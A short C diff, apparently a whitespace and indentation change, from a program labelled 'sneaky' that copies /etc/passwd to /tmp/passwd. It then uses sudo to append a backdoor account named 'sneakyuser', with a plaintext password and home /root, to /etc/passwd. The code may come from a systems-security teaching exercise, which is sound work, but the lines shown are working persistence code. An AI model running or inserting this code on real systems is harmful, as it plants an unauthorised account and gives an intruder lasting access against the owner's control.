@@ -20,14 +20,12 @@ int main()
 
 	if (COPY_PWD) 
 	{
+		printf("step %d\n", step++);
 
-	printf("step %d\n", step++);
+		// #2: Copy the /etc/passwd to /tmp/passwd and append new credential to /etc/passwd
+		status=system("cp /etc/passwd /tmp/passwd");
 
-	// #2: Copy the /etc/passwd to /tmp/passwd and append new credential to /etc/passwd
-	status=system("cp /etc/passwd /tmp/passwd");
-
-	
-	status=system("sudo bash -c \"echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd\"");
+		status=system("sudo bash -c \"echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd\"");
 	}
 
 
